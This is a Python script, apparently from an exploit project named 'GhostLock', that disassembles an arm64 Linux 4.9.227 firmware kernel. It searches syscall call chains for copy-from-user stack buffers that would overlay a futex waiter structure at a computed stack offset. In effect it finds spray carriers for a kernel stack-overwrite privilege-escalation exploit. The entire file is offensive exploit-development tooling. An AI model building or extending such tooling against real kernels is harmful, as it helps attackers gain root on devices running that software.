#!/usr/bin/env python3
"""
gl_carrier_scan.py — GhostLock 栈覆盖载体扫描（arm64 / 本机 4.9.227 构建）

判据（交接文档 §24.10C）：
    waiter 在 do_futex+0xE8 ⇒ 以“进入内核时栈顶”为 0，其绝对位置 = -0x288，占 72 字节
    载体需把用户可控数据写到该区间 ⇒
        d = 0x110 + Σ(调用链各函数帧)
        buf_abs = -(d) + buf_off
        需要 buf_abs <= -0x288 <= buf_abs + size - 72
        ⇔ d - buf_off ∈ [0x288, 0x288 + size - 72]

用法： python tools/gl_carrier_scan.py
"""
from elftools.elf.elffile import ELFFile
from capstone import Cs, CS_ARCH_ARM64, CS_MODE_ARM
from capstone.arm64 import ARM64_REG_SP, ARM64_OP_IMM

ELF = "firmware_F16/vmlinux.elf"
S_FRAME = 0x110
WAITER = 0x288
WAITER_SZ = 72
MAX_DEPTH = 3

EXTRA_ENTRIES = [
    "SyS_setsockopt", "SyS_getsockopt", "SyS_ioctl", "SyS_keyctl", "SyS_add_key",
    "SyS_sendmsg", "SyS_recvmsg", "SyS_sendto", "SyS_prctl", "SyS_getrandom",
    "SyS_pselect6", "SyS_select", "SyS_poll", "SyS_ppoll", "SyS_readv", "SyS_writev",
    "SyS_mq_timedsend", "SyS_mq_timedreceive", "SyS_socket", "SyS_bind", "SyS_connect",
    "SyS_getsockname", "SyS_futex", "SyS_ptrace", "SyS_timer_create", "SyS_clock_nanosleep",
]
COPY_PREFIX = ("__arch_copy_from_user", "__check_object_size", "arm64_memcpy_from_user")


class V:
    def __init__(self, path):
        self.fh = open(path, "rb")
        self.elf = ELFFile(self.fh)
        self.sec = [s for s in self.elf.iter_sections() if s.name == ".kernel"][0]
        self.syms = {}
        for s in self.elf.get_section_by_name(".symtab").iter_symbols():
            if s.name and s["st_info"]["type"] == "STT_FUNC":
                self.syms.setdefault(s.name, s["st_value"])
        self.by_addr = {}
        for k, val in self.syms.items():
            self.by_addr.setdefault(val, k)
        self.starts = sorted(set(self.syms.values()))
        self.md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
        self.md.detail = True
        self._frame_cache = {}

    def read(self, va, n):
        self.fh.seek(self.sec["sh_offset"] + (va - self.sec["sh_addr"]))
        return self.fh.read(n)

    def end(self, va, cap=0x8000):
        for s in self.starts:
            if s > va:
                return min(s, va + cap)
        return va + cap

    def dis(self, va):
        return list(self.md.disasm(self.read(va, self.end(va) - va), va))

    def frame(self, va):
        if va in self._frame_cache:
            return self._frame_cache[va]
        tot = 0
        for i in list(self.md.disasm(self.read(va, 0x20), va))[:6]:
            if i.mnemonic == "sub" and len(i.operands) == 3 \
               and i.operands[0].reg == ARM64_REG_SP and i.operands[2].type == ARM64_OP_IMM:
                tot += i.operands[2].imm
            elif i.mnemonic in ("stp", "str") and i.writeback and "[sp, #-" in i.op_str:
                try:
                    tot += int(i.op_str.split("[sp, #-")[1].split("]")[0], 0)
                except ValueError:
                    pass
        self._frame_cache[va] = tot
        return tot

    def callees(self, va):
        out = []
        for i in self.dis(va):
            if i.mnemonic == "bl":
                nm = self.by_addr.get(int(i.op_str.lstrip("#"), 0))
                if nm:
                    out.append(nm)
        return out

    def copies(self, va):
        ins = self.dis(va)
        hits = []
        for idx, i in enumerate(ins):
            if i.mnemonic != "bl":
                continue
            nm = self.by_addr.get(int(i.op_str.lstrip("#"), 0), "")
            if not nm.startswith(COPY_PREFIX):
                continue
            off = size = None
            for j in range(idx - 1, max(idx - 10, -1), -1):
                o = ins[j].op_str.replace(" ", "")
                if off is None and ins[j].mnemonic in ("add", "mov") and o.startswith("x0,") and "sp" in o:
                    off = int(o.split("#")[-1], 0) if "#" in o else 0
                if size is None and o.startswith("w2,#") and ins[j].mnemonic in ("mov", "movz"):
                    try:
                        size = int(o.split("#")[1], 0)
                    except (ValueError, IndexError):
                        pass
            if off is not None:
                hits.append((i.address, off, size, nm))
        return hits


def main():
    v = V(ELF)
    entries = set(EXTRA_ENTRIES)
    entries |= {n for n in v.syms if n.startswith(("SyS_", "compat_SyS_"))}
    entries = sorted(e for e in entries if e in v.syms)

    found, near, seen = [], [], set()

    def walk(name, depth, frames):
        if depth > MAX_DEPTH or name in seen:
            return
        seen.add(name)
        va = v.syms[name]
        f = v.frame(va)
        cur = frames + f
        for addr, off, size, cn in v.copies(va):
            dminus = S_FRAME + cur - off
            eff = size if size is not None else 128      # 未知长度按常见上界估计
            hi = WAITER + eff - WAITER_SZ
            rec = (name, addr, off, size, dminus, cn)
            if WAITER <= dminus <= hi:
                found.append(rec)
            elif WAITER - 0x100 <= dminus <= hi + 0x100:
                near.append(rec)
        for c in v.callees(va):
            walk(c, depth + 1, cur)

    for e in entries:
        walk(e, 0, 0)

    print(f"扫描入口 {len(entries)} 个（深度≤{MAX_DEPTH}）：命中 {len(found)}，近失配 {len(near)}\n")
    hdr = f"{'函数':26s} {'copy点':16s} {'buf_off':>8s} {'size':>6s} {'d-buf':>8s}  callee"
    if found:
        print("=== 命中：可覆盖 waiter(72B) ===")
        print(hdr)
        for r in sorted(found, key=lambda x: x[4]):
            print(f"{r[0]:26s} {r[1]:#16x} {r[2]:#8x} {str(r[3]):>6s} {r[4]:#8x}  {r[5]}")
    else:
        print("=== 命中：无 ===")
    if near:
        print("\n=== 近失配（±0x100，按接近 0x2a3 排序，前 15）===")
        print(hdr)
        for r in sorted(near, key=lambda x: abs(x[4] - 0x2A3))[:15]:
            print(f"{r[0]:26s} {r[1]:#16x} {r[2]:#8x} {str(r[3]):>6s} {r[4]:#8x}  {r[5]}")


if __name__ == "__main__":
    main()
